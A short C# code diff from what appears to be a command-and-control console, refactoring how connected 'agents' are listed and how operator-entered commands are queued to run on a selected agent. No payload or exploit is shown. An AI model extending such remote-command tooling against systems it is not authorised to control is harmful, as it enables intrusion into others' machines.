@@ -87,11 +87,13 @@ _________         _________ _               ______   _______
         }
         public string[] ListClients(){
             //Converts client list to a string array
-            List<Agent> agents = this.listener.agents;
+            //List<Agent> agents = this.listener.agents;
+            //var enum = this.listener.agents.GetEnumerator();
+            var agents = this.listener.agents;
             string[] agentArr = new string[agents.Count];
             int count = 0;
             foreach (var agent in agents){
-                agentArr[count] = agent.name;
+                agentArr[count] = agent.Key;
                 count++;
             }
             return agentArr;
@@ -109,9 +111,9 @@ _________         _________ _               ______   _______
             );
             //would benefit from Listener.agents being a hash table
             foreach (var agent in this.listener.agents){
-               if(agent.name == prompt){
+               if(agent.Key == prompt){
                   var command = AnsiConsole.Ask<string>("Enter the console [red]command to run:[/] ");
-                  agent.commandQue.AddLast(command);
+                  agent.Value.commandQue.AddLast(command);
                   Console.WriteLine("\n");
                   return 0;
                }
